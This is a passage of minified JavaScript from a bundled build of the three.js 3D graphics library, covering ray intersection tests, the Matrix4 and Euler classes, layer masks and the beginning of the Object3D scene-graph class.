                else h <= -p ? (u = Math.max(0, -(-a * r + o)), h = u > 0 ? -r : Math.min(Math.max(-r, -s), r), d = -u * u + h * (h + 2 * s) + l) : h <= p ? (u = 0, h = Math.min(Math.max(-r, -s), r), d = h * (h + 2 * s) + l) : (u = Math.max(0, -(a * r + o)), h = u > 0 ? r : Math.min(Math.max(-r, -s), r), d = -u * u + h * (h + 2 * s) + l);
                else h = a > 0 ? -r : r, u = Math.max(0, -(a * h + o)), d = -u * u + h * (h + 2 * s) + l;
                return n && n.copy(this.direction).multiplyScalar(u).add(this.origin), i && i.copy(Ve).multiplyScalar(h).add(ke), d
            }
            intersectSphere(e, t) {
                Ge.subVectors(e.center, this.origin);
                const n = Ge.dot(this.direction),
                    i = Ge.dot(Ge) - n * n,
                    r = e.radius * e.radius;
                if (i > r) return null;
                const a = Math.sqrt(r - i),
                    o = n - a,
                    s = n + a;
                return o < 0 && s < 0 ? null : o < 0 ? this.at(s, t) : this.at(o, t)
            }
            intersectsSphere(e) { return this.distanceSqToPoint(e.center) <= e.radius * e.radius }
            distanceToPlane(e) { const t = e.normal.dot(this.direction); if (0 === t) return 0 === e.distanceToPoint(this.origin) ? 0 : null; const n = -(this.origin.dot(e.normal) + e.constant) / t; return n >= 0 ? n : null }
            intersectPlane(e, t) { const n = this.distanceToPlane(e); return null === n ? null : this.at(n, t) }
            intersectsPlane(e) { const t = e.distanceToPoint(this.origin); return 0 === t || e.normal.dot(this.direction) * t < 0 }
            intersectBox(e, t) {
                let n, i, r, a, o, s;
                const l = 1 / this.direction.x,
                    c = 1 / this.direction.y,
                    u = 1 / this.direction.z,
                    h = this.origin;
                return l >= 0 ? (n = (e.min.x - h.x) * l, i = (e.max.x - h.x) * l) : (n = (e.max.x - h.x) * l, i = (e.min.x - h.x) * l), c >= 0 ? (r = (e.min.y - h.y) * c, a = (e.max.y - h.y) * c) : (r = (e.max.y - h.y) * c, a = (e.min.y - h.y) * c), n > a || r > i ? null : ((r > n || n != n) && (n = r), (a < i || i != i) && (i = a), u >= 0 ? (o = (e.min.z - h.z) * u, s = (e.max.z - h.z) * u) : (o = (e.max.z - h.z) * u, s = (e.min.z - h.z) * u), n > s || o > i ? null : ((o > n || n != n) && (n = o), (s < i || i != i) && (i = s), i < 0 ? null : this.at(n >= 0 ? n : i, t)))
            }
            intersectsBox(e) { return null !== this.intersectBox(e, Ge) }
            intersectTriangle(e, t, n, i, r) {
                je.subVectors(t, e), qe.subVectors(n, e), Xe.crossVectors(je, qe);
                let a, o = this.direction.dot(Xe);
                if (o > 0) {
                    if (i) return null;
                    a = 1
                } else {
                    if (!(o < 0)) return null;
                    a = -1, o = -o
                }
                We.subVectors(this.origin, e);
                const s = a * this.direction.dot(qe.crossVectors(We, qe));
                if (s < 0) return null;
                const l = a * this.direction.dot(je.cross(We));
                if (l < 0) return null;
                if (s + l > o) return null;
                const c = -a * We.dot(Xe);
                return c < 0 ? null : this.at(c / o, r)
            }
            applyMatrix4(e) { return this.origin.applyMatrix4(e), this.direction.transformDirection(e), this }
            equals(e) { return e.origin.equals(this.origin) && e.direction.equals(this.direction) }
            clone() { return (new this.constructor).copy(this) }
        }
        class Ze {
            constructor() { this.elements = [1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1], arguments.length > 0 && console.error("THREE.Matrix4: the constructor no longer reads arguments. use .set() instead.") }
            set(e, t, n, i, r, a, o, s, l, c, u, h, d, p, f, m) { const g = this.elements; return g[0] = e, g[4] = t, g[8] = n, g[12] = i, g[1] = r, g[5] = a, g[9] = o, g[13] = s, g[2] = l, g[6] = c, g[10] = u, g[14] = h, g[3] = d, g[7] = p, g[11] = f, g[15] = m, this }
            identity() { return this.set(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1), this }
            clone() { return (new Ze).fromArray(this.elements) }
            copy(e) {
                const t = this.elements,
                    n = e.elements;
                return t[0] = n[0], t[1] = n[1], t[2] = n[2], t[3] = n[3], t[4] = n[4], t[5] = n[5], t[6] = n[6], t[7] = n[7], t[8] = n[8], t[9] = n[9], t[10] = n[10], t[11] = n[11], t[12] = n[12], t[13] = n[13], t[14] = n[14], t[15] = n[15], this
            }
            copyPosition(e) {
                const t = this.elements,
                    n = e.elements;
                return t[12] = n[12], t[13] = n[13], t[14] = n[14], this
            }
            setFromMatrix3(e) { const t = e.elements; return this.set(t[0], t[3], t[6], 0, t[1], t[4], t[7], 0, t[2], t[5], t[8], 0, 0, 0, 0, 1), this }
            extractBasis(e, t, n) { return e.setFromMatrixColumn(this, 0), t.setFromMatrixColumn(this, 1), n.setFromMatrixColumn(this, 2), this }
            makeBasis(e, t, n) { return this.set(e.x, t.x, n.x, 0, e.y, t.y, n.y, 0, e.z, t.z, n.z, 0, 0, 0, 0, 1), this }
            extractRotation(e) {
                const t = this.elements,
                    n = e.elements,
                    i = 1 / Je.setFromMatrixColumn(e, 0).length(),
                    r = 1 / Je.setFromMatrixColumn(e, 1).length(),
                    a = 1 / Je.setFromMatrixColumn(e, 2).length();
                return t[0] = n[0] * i, t[1] = n[1] * i, t[2] = n[2] * i, t[3] = 0, t[4] = n[4] * r, t[5] = n[5] * r, t[6] = n[6] * r, t[7] = 0, t[8] = n[8] * a, t[9] = n[9] * a, t[10] = n[10] * a, t[11] = 0, t[12] = 0, t[13] = 0, t[14] = 0, t[15] = 1, this
            }
            makeRotationFromEuler(e) {
                e && e.isEuler || console.error("THREE.Matrix4: .makeRotationFromEuler() now expects a Euler rotation rather than a Vector3 and order.");
                const t = this.elements,
                    n = e.x,
                    i = e.y,
                    r = e.z,
                    a = Math.cos(n),
                    o = Math.sin(n),
                    s = Math.cos(i),
                    l = Math.sin(i),
                    c = Math.cos(r),
                    u = Math.sin(r);
                if ("XYZ" === e.order) {
                    const e = a * c,
                        n = a * u,
                        i = o * c,
                        r = o * u;
                    t[0] = s * c, t[4] = -s * u, t[8] = l, t[1] = n + i * l, t[5] = e - r * l, t[9] = -o * s, t[2] = r - e * l, t[6] = i + n * l, t[10] = a * s
                } else if ("YXZ" === e.order) {
                    const e = s * c,
                        n = s * u,
                        i = l * c,
                        r = l * u;
                    t[0] = e + r * o, t[4] = i * o - n, t[8] = a * l, t[1] = a * u, t[5] = a * c, t[9] = -o, t[2] = n * o - i, t[6] = r + e * o, t[10] = a * s
                } else if ("ZXY" === e.order) {
                    const e = s * c,
                        n = s * u,
                        i = l * c,
                        r = l * u;
                    t[0] = e - r * o, t[4] = -a * u, t[8] = i + n * o, t[1] = n + i * o, t[5] = a * c, t[9] = r - e * o, t[2] = -a * l, t[6] = o, t[10] = a * s
                } else if ("ZYX" === e.order) {
                    const e = a * c,
                        n = a * u,
                        i = o * c,
                        r = o * u;
                    t[0] = s * c, t[4] = i * l - n, t[8] = e * l + r, t[1] = s * u, t[5] = r * l + e, t[9] = n * l - i, t[2] = -l, t[6] = o * s, t[10] = a * s
                } else if ("YZX" === e.order) {
                    const e = a * s,
                        n = a * l,
                        i = o * s,
                        r = o * l;
                    t[0] = s * c, t[4] = r - e * u, t[8] = i * u + n, t[1] = u, t[5] = a * c, t[9] = -o * c, t[2] = -l * c, t[6] = n * u + i, t[10] = e - r * u
                } else if ("XZY" === e.order) {
                    const e = a * s,
                        n = a * l,
                        i = o * s,
                        r = o * l;
                    t[0] = s * c, t[4] = -u, t[8] = l * c, t[1] = e * u + r, t[5] = a * c, t[9] = n * u - i, t[2] = i * u - n, t[6] = o * c, t[10] = r * u + e
                }
                return t[3] = 0, t[7] = 0, t[11] = 0, t[12] = 0, t[13] = 0, t[14] = 0, t[15] = 1, this
            }
            makeRotationFromQuaternion(e) { return this.compose($e, e, Qe) }
            lookAt(e, t, n) { const i = this.elements; return nt.subVectors(e, t), 0 === nt.lengthSq() && (nt.z = 1), nt.normalize(), et.crossVectors(n, nt), 0 === et.lengthSq() && (1 === Math.abs(n.z) ? nt.x += 1e-4 : nt.z += 1e-4, nt.normalize(), et.crossVectors(n, nt)), et.normalize(), tt.crossVectors(nt, et), i[0] = et.x, i[4] = tt.x, i[8] = nt.x, i[1] = et.y, i[5] = tt.y, i[9] = nt.y, i[2] = et.z, i[6] = tt.z, i[10] = nt.z, this }
            multiply(e, t) { return void 0 !== t ? (console.warn("THREE.Matrix4: .multiply() now only accepts one argument. Use .multiplyMatrices( a, b ) instead."), this.multiplyMatrices(e, t)) : this.multiplyMatrices(this, e) }
            premultiply(e) { return this.multiplyMatrices(e, this) }
            multiplyMatrices(e, t) {
                const n = e.elements,
                    i = t.elements,
                    r = this.elements,
                    a = n[0],
                    o = n[4],
                    s = n[8],
                    l = n[12],
                    c = n[1],
                    u = n[5],
                    h = n[9],
                    d = n[13],
                    p = n[2],
                    f = n[6],
                    m = n[10],
                    g = n[14],
                    v = n[3],
                    y = n[7],
                    x = n[11],
                    _ = n[15],
                    b = i[0],
                    w = i[4],
                    M = i[8],
                    T = i[12],
                    E = i[1],
                    S = i[5],
                    L = i[9],
                    A = i[13],
                    R = i[2],
                    P = i[6],
                    C = i[10],
                    D = i[14],
                    N = i[3],
                    I = i[7],
                    O = i[11],
                    H = i[15];
                return r[0] = a * b + o * E + s * R + l * N, r[4] = a * w + o * S + s * P + l * I, r[8] = a * M + o * L + s * C + l * O, r[12] = a * T + o * A + s * D + l * H, r[1] = c * b + u * E + h * R + d * N, r[5] = c * w + u * S + h * P + d * I, r[9] = c * M + u * L + h * C + d * O, r[13] = c * T + u * A + h * D + d * H, r[2] = p * b + f * E + m * R + g * N, r[6] = p * w + f * S + m * P + g * I, r[10] = p * M + f * L + m * C + g * O, r[14] = p * T + f * A + m * D + g * H, r[3] = v * b + y * E + x * R + _ * N, r[7] = v * w + y * S + x * P + _ * I, r[11] = v * M + y * L + x * C + _ * O, r[15] = v * T + y * A + x * D + _ * H, this
            }
            multiplyScalar(e) { const t = this.elements; return t[0] *= e, t[4] *= e, t[8] *= e, t[12] *= e, t[1] *= e, t[5] *= e, t[9] *= e, t[13] *= e, t[2] *= e, t[6] *= e, t[10] *= e, t[14] *= e, t[3] *= e, t[7] *= e, t[11] *= e, t[15] *= e, this }
            determinant() {
                const e = this.elements,
                    t = e[0],
                    n = e[4],
                    i = e[8],
                    r = e[12],
                    a = e[1],
                    o = e[5],
                    s = e[9],
                    l = e[13],
                    c = e[2],
                    u = e[6],
                    h = e[10],
                    d = e[14];
                return e[3] * (+r * s * u - i * l * u - r * o * h + n * l * h + i * o * d - n * s * d) + e[7] * (+t * s * d - t * l * h + r * a * h - i * a * d + i * l * c - r * s * c) + e[11] * (+t * l * u - t * o * d - r * a * u + n * a * d + r * o * c - n * l * c) + e[15] * (-i * o * c - t * s * u + t * o * h + i * a * u - n * a * h + n * s * c)
            }
            transpose() { const e = this.elements; let t; return t = e[1], e[1] = e[4], e[4] = t, t = e[2], e[2] = e[8], e[8] = t, t = e[6], e[6] = e[9], e[9] = t, t = e[3], e[3] = e[12], e[12] = t, t = e[7], e[7] = e[13], e[13] = t, t = e[11], e[11] = e[14], e[14] = t, this }
            setPosition(e, t, n) { const i = this.elements; return e.isVector3 ? (i[12] = e.x, i[13] = e.y, i[14] = e.z) : (i[12] = e, i[13] = t, i[14] = n), this }
            invert() {
                const e = this.elements,
                    t = e[0],
                    n = e[1],
                    i = e[2],
                    r = e[3],
                    a = e[4],
                    o = e[5],
                    s = e[6],
                    l = e[7],
                    c = e[8],
                    u = e[9],
                    h = e[10],
                    d = e[11],
                    p = e[12],
                    f = e[13],
                    m = e[14],
                    g = e[15],
                    v = u * m * l - f * h * l + f * s * d - o * m * d - u * s * g + o * h * g,
                    y = p * h * l - c * m * l - p * s * d + a * m * d + c * s * g - a * h * g,
                    x = c * f * l - p * u * l + p * o * d - a * f * d - c * o * g + a * u * g,
                    _ = p * u * s - c * f * s - p * o * h + a * f * h + c * o * m - a * u * m,
                    b = t * v + n * y + i * x + r * _;
                if (0 === b) return this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0);
                const w = 1 / b;
                return e[0] = v * w, e[1] = (f * h * r - u * m * r - f * i * d + n * m * d + u * i * g - n * h * g) * w, e[2] = (o * m * r - f * s * r + f * i * l - n * m * l - o * i * g + n * s * g) * w, e[3] = (u * s * r - o * h * r - u * i * l + n * h * l + o * i * d - n * s * d) * w, e[4] = y * w, e[5] = (c * m * r - p * h * r + p * i * d - t * m * d - c * i * g + t * h * g) * w, e[6] = (p * s * r - a * m * r - p * i * l + t * m * l + a * i * g - t * s * g) * w, e[7] = (a * h * r - c * s * r + c * i * l - t * h * l - a * i * d + t * s * d) * w, e[8] = x * w, e[9] = (p * u * r - c * f * r - p * n * d + t * f * d + c * n * g - t * u * g) * w, e[10] = (a * f * r - p * o * r + p * n * l - t * f * l - a * n * g + t * o * g) * w, e[11] = (c * o * r - a * u * r - c * n * l + t * u * l + a * n * d - t * o * d) * w, e[12] = _ * w, e[13] = (c * f * i - p * u * i + p * n * h - t * f * h - c * n * m + t * u * m) * w, e[14] = (p * o * i - a * f * i - p * n * s + t * f * s + a * n * m - t * o * m) * w, e[15] = (a * u * i - c * o * i + c * n * s - t * u * s - a * n * h + t * o * h) * w, this
            }
            scale(e) {
                const t = this.elements,
                    n = e.x,
                    i = e.y,
                    r = e.z;
                return t[0] *= n, t[4] *= i, t[8] *= r, t[1] *= n, t[5] *= i, t[9] *= r, t[2] *= n, t[6] *= i, t[10] *= r, t[3] *= n, t[7] *= i, t[11] *= r, this
            }
            getMaxScaleOnAxis() {
                const e = this.elements,
                    t = e[0] * e[0] + e[1] * e[1] + e[2] * e[2],
                    n = e[4] * e[4] + e[5] * e[5] + e[6] * e[6],
                    i = e[8] * e[8] + e[9] * e[9] + e[10] * e[10];
                return Math.sqrt(Math.max(t, n, i))
            }
            makeTranslation(e, t, n) { return this.set(1, 0, 0, e, 0, 1, 0, t, 0, 0, 1, n, 0, 0, 0, 1), this }
            makeRotationX(e) {
                const t = Math.cos(e),
                    n = Math.sin(e);
                return this.set(1, 0, 0, 0, 0, t, -n, 0, 0, n, t, 0, 0, 0, 0, 1), this
            }
            makeRotationY(e) {
                const t = Math.cos(e),
                    n = Math.sin(e);
                return this.set(t, 0, n, 0, 0, 1, 0, 0, -n, 0, t, 0, 0, 0, 0, 1), this
            }
            makeRotationZ(e) {
                const t = Math.cos(e),
                    n = Math.sin(e);
                return this.set(t, -n, 0, 0, n, t, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1), this
            }
            makeRotationAxis(e, t) {
                const n = Math.cos(t),
                    i = Math.sin(t),
                    r = 1 - n,
                    a = e.x,
                    o = e.y,
                    s = e.z,
                    l = r * a,
                    c = r * o;
                return this.set(l * a + n, l * o - i * s, l * s + i * o, 0, l * o + i * s, c * o + n, c * s - i * a, 0, l * s - i * o, c * s + i * a, r * s * s + n, 0, 0, 0, 0, 1), this
            }
            makeScale(e, t, n) { return this.set(e, 0, 0, 0, 0, t, 0, 0, 0, 0, n, 0, 0, 0, 0, 1), this }
            makeShear(e, t, n) { return this.set(1, t, n, 0, e, 1, n, 0, e, t, 1, 0, 0, 0, 0, 1), this }
            compose(e, t, n) {
                const i = this.elements,
                    r = t._x,
                    a = t._y,
                    o = t._z,
                    s = t._w,
                    l = r + r,
                    c = a + a,
                    u = o + o,
                    h = r * l,
                    d = r * c,
                    p = r * u,
                    f = a * c,
                    m = a * u,
                    g = o * u,
                    v = s * l,
                    y = s * c,
                    x = s * u,
                    _ = n.x,
                    b = n.y,
                    w = n.z;
                return i[0] = (1 - (f + g)) * _, i[1] = (d + x) * _, i[2] = (p - y) * _, i[3] = 0, i[4] = (d - x) * b, i[5] = (1 - (h + g)) * b, i[6] = (m + v) * b, i[7] = 0, i[8] = (p + y) * w, i[9] = (m - v) * w, i[10] = (1 - (h + f)) * w, i[11] = 0, i[12] = e.x, i[13] = e.y, i[14] = e.z, i[15] = 1, this
            }
            decompose(e, t, n) {
                const i = this.elements;
                let r = Je.set(i[0], i[1], i[2]).length();
                const a = Je.set(i[4], i[5], i[6]).length(),
                    o = Je.set(i[8], i[9], i[10]).length();
                this.determinant() < 0 && (r = -r), e.x = i[12], e.y = i[13], e.z = i[14], Ke.copy(this);
                const s = 1 / r,
                    l = 1 / a,
                    c = 1 / o;
                return Ke.elements[0] *= s, Ke.elements[1] *= s, Ke.elements[2] *= s, Ke.elements[4] *= l, Ke.elements[5] *= l, Ke.elements[6] *= l, Ke.elements[8] *= c, Ke.elements[9] *= c, Ke.elements[10] *= c, t.setFromRotationMatrix(Ke), n.x = r, n.y = a, n.z = o, this
            }
            makePerspective(e, t, n, i, r, a) {
                void 0 === a && console.warn("THREE.Matrix4: .makePerspective() has been redefined and has a new signature. Please check the docs.");
                const o = this.elements,
                    s = 2 * r / (t - e),
                    l = 2 * r / (n - i),
                    c = (t + e) / (t - e),
                    u = (n + i) / (n - i),
                    h = -(a + r) / (a - r),
                    d = -2 * a * r / (a - r);
                return o[0] = s, o[4] = 0, o[8] = c, o[12] = 0, o[1] = 0, o[5] = l, o[9] = u, o[13] = 0, o[2] = 0, o[6] = 0, o[10] = h, o[14] = d, o[3] = 0, o[7] = 0, o[11] = -1, o[15] = 0, this
            }
            makeOrthographic(e, t, n, i, r, a) {
                const o = this.elements,
                    s = 1 / (t - e),
                    l = 1 / (n - i),
                    c = 1 / (a - r),
                    u = (t + e) * s,
                    h = (n + i) * l,
                    d = (a + r) * c;
                return o[0] = 2 * s, o[4] = 0, o[8] = 0, o[12] = -u, o[1] = 0, o[5] = 2 * l, o[9] = 0, o[13] = -h, o[2] = 0, o[6] = 0, o[10] = -2 * c, o[14] = -d, o[3] = 0, o[7] = 0, o[11] = 0, o[15] = 1, this
            }
            equals(e) {
                const t = this.elements,
                    n = e.elements;
                for (let e = 0; e < 16; e++)
                    if (t[e] !== n[e]) return !1;
                return !0
            }
            fromArray(e, t = 0) { for (let n = 0; n < 16; n++) this.elements[n] = e[n + t]; return this }
            toArray(e = [], t = 0) { const n = this.elements; return e[t] = n[0], e[t + 1] = n[1], e[t + 2] = n[2], e[t + 3] = n[3], e[t + 4] = n[4], e[t + 5] = n[5], e[t + 6] = n[6], e[t + 7] = n[7], e[t + 8] = n[8], e[t + 9] = n[9], e[t + 10] = n[10], e[t + 11] = n[11], e[t + 12] = n[12], e[t + 13] = n[13], e[t + 14] = n[14], e[t + 15] = n[15], e }
        }
        Ze.prototype.isMatrix4 = !0;
        const Je = new be,
            Ke = new Ze,
            $e = new be(0, 0, 0),
            Qe = new be(1, 1, 1),
            et = new be,
            tt = new be,
            nt = new be,
            it = new Ze,
            rt = new _e;
        class at {
            constructor(e = 0, t = 0, n = 0, i = at.DefaultOrder) { this._x = e, this._y = t, this._z = n, this._order = i }
            get x() { return this._x }
            set x(e) { this._x = e, this._onChangeCallback() }
            get y() { return this._y }
            set y(e) { this._y = e, this._onChangeCallback() }
            get z() { return this._z }
            set z(e) { this._z = e, this._onChangeCallback() }
            get order() { return this._order }
            set order(e) { this._order = e, this._onChangeCallback() }
            set(e, t, n, i) { return this._x = e, this._y = t, this._z = n, this._order = i || this._order, this._onChangeCallback(), this }
            clone() { return new this.constructor(this._x, this._y, this._z, this._order) }
            copy(e) { return this._x = e._x, this._y = e._y, this._z = e._z, this._order = e._order, this._onChangeCallback(), this }
            setFromRotationMatrix(e, t, n) {
                const i = ue.clamp,
                    r = e.elements,
                    a = r[0],
                    o = r[4],
                    s = r[8],
                    l = r[1],
                    c = r[5],
                    u = r[9],
                    h = r[2],
                    d = r[6],
                    p = r[10];
                switch (t = t || this._order) {
                    case "XYZ":
                        this._y = Math.asin(i(s, -1, 1)), Math.abs(s) < .9999999 ? (this._x = Math.atan2(-u, p), this._z = Math.atan2(-o, a)) : (this._x = Math.atan2(d, c), this._z = 0);
                        break;
                    case "YXZ":
                        this._x = Math.asin(-i(u, -1, 1)), Math.abs(u) < .9999999 ? (this._y = Math.atan2(s, p), this._z = Math.atan2(l, c)) : (this._y = Math.atan2(-h, a), this._z = 0);
                        break;
                    case "ZXY":
                        this._x = Math.asin(i(d, -1, 1)), Math.abs(d) < .9999999 ? (this._y = Math.atan2(-h, p), this._z = Math.atan2(-o, c)) : (this._y = 0, this._z = Math.atan2(l, a));
                        break;
                    case "ZYX":
                        this._y = Math.asin(-i(h, -1, 1)), Math.abs(h) < .9999999 ? (this._x = Math.atan2(d, p), this._z = Math.atan2(l, a)) : (this._x = 0, this._z = Math.atan2(-o, c));
                        break;
                    case "YZX":
                        this._z = Math.asin(i(l, -1, 1)), Math.abs(l) < .9999999 ? (this._x = Math.atan2(-u, c), this._y = Math.atan2(-h, a)) : (this._x = 0, this._y = Math.atan2(s, p));
                        break;
                    case "XZY":
                        this._z = Math.asin(-i(o, -1, 1)), Math.abs(o) < .9999999 ? (this._x = Math.atan2(d, c), this._y = Math.atan2(s, a)) : (this._x = Math.atan2(-u, p), this._y = 0);
                        break;
                    default:
                        console.warn("THREE.Euler: .setFromRotationMatrix() encountered an unknown order: " + t)
                }
                return this._order = t, !1 !== n && this._onChangeCallback(), this
            }
            setFromQuaternion(e, t, n) { return it.makeRotationFromQuaternion(e), this.setFromRotationMatrix(it, t, n) }
            setFromVector3(e, t) { return this.set(e.x, e.y, e.z, t || this._order) }
            reorder(e) { return rt.setFromEuler(this), this.setFromQuaternion(rt, e) }
            equals(e) { return e._x === this._x && e._y === this._y && e._z === this._z && e._order === this._order }
            fromArray(e) { return this._x = e[0], this._y = e[1], this._z = e[2], void 0 !== e[3] && (this._order = e[3]), this._onChangeCallback(), this }
            toArray(e = [], t = 0) { return e[t] = this._x, e[t + 1] = this._y, e[t + 2] = this._z, e[t + 3] = this._order, e }
            toVector3(e) { return e ? e.set(this._x, this._y, this._z) : new be(this._x, this._y, this._z) }
            _onChange(e) { return this._onChangeCallback = e, this }
            _onChangeCallback() {}
        }
        at.prototype.isEuler = !0, at.DefaultOrder = "XYZ", at.RotationOrders = ["XYZ", "YZX", "ZXY", "XZY", "YXZ", "ZYX"];
        class ot {
            constructor() { this.mask = 1 }
            set(e) { this.mask = 1 << e }
            enable(e) { this.mask |= 1 << e }
            enableAll() { this.mask = -1 }
            toggle(e) { this.mask ^= 1 << e }
            disable(e) { this.mask &= ~(1 << e) }
            disableAll() { this.mask = 0 }
            test(e) { return !!(this.mask & e.mask) }
        }
        let st = 0;
        const lt = new be,
            ct = new _e,
            ut = new Ze,
            ht = new be,
            dt = new be,
            pt = new be,
            ft = new _e,
            mt = new be(1, 0, 0),
            gt = new be(0, 1, 0),
            vt = new be(0, 0, 1),
            yt = { type: "added" },
            xt = { type: "removed" };

        function _t() {
            Object.defineProperty(this, "id", { value: st++ }), this.uuid = ue.generateUUID(), this.name = "", this.type = "Object3D", this.parent = null, this.children = [], this.up = _t.DefaultUp.clone();
            const e = new be,
                t = new at,
                n = new _e,
                i = new be(1, 1, 1);
            t._onChange((function() { n.setFromEuler(t, !1) })), n._onChange((function() { t.setFromQuaternion(n, void 0, !1) })), Object.defineProperties(this, { position: { configurable: !0, enumerable: !0, value: e }, rotation: { configurable: !0, enumerable: !0, value: t }, quaternion: { configurable: !0, enumerable: !0, value: n }, scale: { configurable: !0, enumerable: !0, value: i }, modelViewMatrix: { value: new Ze }, normalMatrix: { value: new de } }), this.matrix = new Ze, this.matrixWorld = new Ze, this.matrixAutoUpdate = _t.DefaultMatrixAutoUpdate, this.matrixWorldNeedsUpdate = !1, this.layers = new ot, this.visible = !0, this.castShadow = !1, this.receiveShadow = !1, this.frustumCulled = !0, this.renderOrder = 0, this.animations = [], this.userData = {}
        }
        _t.DefaultUp = new be(0, 1, 0), _t.DefaultMatrixAutoUpdate = !0, _t.prototype = Object.assign(Object.create(se.prototype), {
            constructor: _t,
            isObject3D: !0,
            onBeforeRender: function() {},
            onAfterRender: function() {},
            applyMatrix4: function(e) { this.matrixAutoUpdate && this.updateMatrix(), this.matrix.premultiply(e), this.matrix.decompose(this.position, this.quaternion, this.scale) },
            applyQuaternion: function(e) { return this.quaternion.premultiply(e), this },
            setRotationFromAxisAngle: function(e, t) { this.quaternion.setFromAxisAngle(e, t) },
            setRotationFromEuler: function(e) { this.quaternion.setFromEuler(e, !0) },
            setRotationFromMatrix: function(e) { this.quaternion.setFromRotationMatrix(e) },
            setRotationFromQuaternion: function(e) { this.quaternion.copy(e) },
            rotateOnAxis: function(e, t) { return ct.setFromAxisAngle(e, t), this.quaternion.multiply(ct), this },
            rotateOnWorldAxis: function(e, t) { return ct.setFromAxisAngle(e, t), this.quaternion.premultiply(ct), this },
            rotateX: function(e) { return this.rotateOnAxis(mt, e) },
            rotateY: function(e) { return this.rotateOnAxis(gt, e) },
            rotateZ: function(e) { return this.rotateOnAxis(vt, e) },
            translateOnAxis: function(e, t) { return lt.copy(e).applyQuaternion(this.quaternion), this.position.add(lt.multiplyScalar(t)), this },
            translateX: function(e) { return this.translateOnAxis(mt, e) },
            translateY: function(e) { return this.translateOnAxis(gt, e) },
            translateZ: function(e) { return this.translateOnAxis(vt, e) },
            localToWorld: function(e) { return e.applyMatrix4(this.matrixWorld) },
            worldToLocal: function(e) { return e.applyMatrix4(ut.copy(this.matrixWorld).invert()) },
            lookAt: function(e, t, n) {
                e.isVector3 ? ht.copy(e) : ht.set(e, t, n);
                const i = this.parent;
                this.updateWorldMatrix(!0, !1), dt.setFromMatrixPosition(this.matrixWorld), this.isCamera || this.isLight ? ut.lookAt(dt, ht, this.up) : ut.lookAt(ht, dt, this.up), this.quaternion.setFromRotationMatrix(ut), i && (ut.extractRotation(i.matrixWorld), ct.setFromRotationMatrix(ut), this.quaternion.premultiply(ct.invert()))
            },
            add: function(e) { if (arguments.length > 1) { for (let e = 0; e < arguments.length; e++) this.add(arguments[e]); return this } return e === this ? (console.error("THREE.Object3D.add: object can't be added as a child of itself.", e), this) : (e && e.isObject3D ? (null !== e.parent && e.parent.remove(e), e.parent = this, this.children.push(e), e.dispatchEvent(yt)) : console.error("THREE.Object3D.add: object not an instance of THREE.Object3D.", e), this) },
            remove: function(e) { if (arguments.length > 1) { for (let e = 0; e < arguments.length; e++) this.remove(arguments[e]); return this } const t = this.children.indexOf(e); return -1 !== t && (e.parent = null, this.children.splice(t, 1), e.dispatchEvent(xt)), this },
            clear: function() {
                for (let e = 0; e < this.children.length; e++) {
                    const t = this.children[e];
                    t.parent = null, t.dispatchEvent(xt)
                }
                return this.children.length = 0, this
            },
            attach: function(e) { return this.updateWorldMatrix(!0, !1), ut.copy(this.matrixWorld).invert(), null !== e.parent && (e.parent.updateWorldMatrix(!0, !1), ut.multiply(e.parent.matrixWorld)), e.applyMatrix4(ut), this.add(e), e.updateWorldMatrix(!1, !0), this },
            getObjectById: function(e) { return this.getObjectByProperty("id", e) },
            getObjectByName: function(e) { return this.getObjectByProperty("name", e) },
            getObjectByProperty: function(e, t) { if (this[e] === t) return this; for (let n = 0, i = this.children.length; n < i; n++) { const i = this.children[n].getObjectByProperty(e, t); if (void 0 !== i) return i } },
            getWorldPosition: function(e) { return void 0 === e && (console.warn("THREE.Object3D: .getWorldPosition() target is now required"), e = new be), this.updateWorldMatrix(!0, !1), e.setFromMatrixPosition(this.matrixWorld) },
            getWorldQuaternion: function(e) { return void 0 === e && (console.warn("THREE.Object3D: .getWorldQuaternion() target is now required"), e = new _e), this.updateWorldMatrix(!0, !1), this.matrixWorld.decompose(dt, e, pt), e },
            getWorldScale: function(e) { return void 0 === e && (console.warn("THREE.Object3D: .getWorldScale() target is now required"), e = new be), this.updateWorldMatrix(!0, !1), this.matrixWorld.decompose(dt, ft, e), e },
            getWorldDirection: function(e) { void 0 === e && (console.warn("THREE.Object3D: .getWorldDirection() target is now required"), e = new be), this.updateWorldMatrix(!0, !1); const t = this.matrixWorld.elements; return e.set(t[8], t[9], t[10]).normalize() },
            raycast: function() {},
            traverse: function(e) { e(this); const t = this.children; for (let n = 0, i = t.length; n < i; n++) t[n].traverse(e) },
            traverseVisible: function(e) {
                if (!1 === this.visible) return;
                e(this);
                const t = this.children;
                for (let n = 0, i = t.length; n < i; n++) t[n].traverseVisible(e)
            },
            traverseAncestors: function(e) {
                const t = this.parent;
                null !== t && (e(t), t.traverseAncestors(e))
            },
            updateMatrix: function() { this.matrix.compose(this.position, this.quaternion, this.scale), this.matrixWorldNeedsUpdate = !0 },
            updateMatrixWorld: function(e) { this.matrixAutoUpdate && this.updateMatrix(), (this.matrixWorldNeedsUpdate || e) && (null === this.parent ? this.matrixWorld.copy(this.matrix) : this.matrixWorld.multiplyMatrices(this.parent.matrixWorld, this.matrix), this.matrixWorldNeedsUpdate = !1, e = !0); const t = this.children; for (let n = 0, i = t.length; n < i; n++) t[n].updateMatrixWorld(e) },
            updateWorldMatrix: function(e, t) { const n = this.parent; if (!0 === e && null !== n && n.updateWorldMatrix(!0, !1), this.matrixAutoUpdate && this.updateMatrix(), null === this.parent ? this.matrixWorld.copy(this.matrix) : this.matrixWorld.multiplyMatrices(this.parent.matrixWorld, this.matrix), !0 === t) { const e = this.children; for (let t = 0, n = e.length; t < n; t++) e[t].updateWorldMatrix(!1, !0) } },
            toJSON: function(e) {
                const t = void 0 === e || "string" == typeof e,
                    n = {};
                t && (e = { geometries: {}, materials: {}, textures: {}, images: {}, shapes: {}, skeletons: {}, animations: {} }, n.metadata = { version: 4.5, type: "Object", generator: "Object3D.toJSON" });
                const i = {};

                function r(t, n) { return void 0 === t[n.uuid] && (t[n.uuid] = n.toJSON(e)), n.uuid }
